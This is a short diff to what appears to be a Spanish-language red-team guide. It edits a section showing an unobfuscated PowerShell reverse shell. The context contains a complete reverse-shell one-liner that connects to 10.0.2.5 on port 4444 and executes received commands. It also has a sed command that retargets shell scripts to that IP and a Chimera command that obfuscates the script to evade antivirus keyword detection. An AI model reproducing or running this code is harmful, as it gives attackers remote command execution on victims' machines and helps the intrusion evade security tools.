@@ -175,6 +175,10 @@ $Patch = [Byte[]] (0xc3, 0x90, 0x90)
 <details><summary>Reverse Shell en PowerShell sin ofuscar</summary>
 <p>
 
+ ```bash
+/opt/chimera$ sed -i 's/192.168.56.101/10.0.2.5/g' shells/*.ps1
+ ```
+ 
 ```PowerShell
 $client = New-Object System.Net.Sockets.TCPClient("10.0.2.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -182,6 +186,5 @@ $client = New-Object System.Net.Sockets.TCPClient("10.0.2.5",4444);$stream = $cl
 </details>
 
 ```bash
-/opt/chimera$ sed -i 's/192.168.56.101/10.0.2.5/g' shells/*.ps1
 /opt/chimera.sh -f /opt/shells/powershell_reverse_shell.ps1 -o /tmp/chimera.ps1 -l 4 -v -c -i -j -g -r -p -b new-object,out-string
  ```
